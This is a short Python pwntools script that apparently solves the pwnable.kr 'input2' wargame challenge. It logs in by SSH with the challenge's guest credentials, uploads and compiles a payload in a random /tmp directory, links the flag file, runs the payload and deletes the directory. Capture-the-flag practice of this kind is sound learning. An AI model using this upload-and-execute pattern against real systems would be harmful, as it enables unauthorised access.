from pwn import *
import random, string

def rstring(length):
    return ''.join([random.choice(string.ascii_uppercase + string.digits) for _ in range(length)])

attack_dir = '/tmp/' + rstring(16)
s = ssh(host='pwnable.kr', port=2222, user='input2', password='guest')
s.run_to_end('mkdir ' + attack_dir + '; cd ' + attack_dir)
s.set_working_directory(attack_dir)
s.upload_file('payload.c')
s.run_to_end('gcc -o payload payload.c')
s.run_to_end('ln -sf /home/input2/flag flag')

p = s.process(['./payload', attack_dir])
print(p.recvall())
s.run_to_end('rm -rf ' + attack_dir)
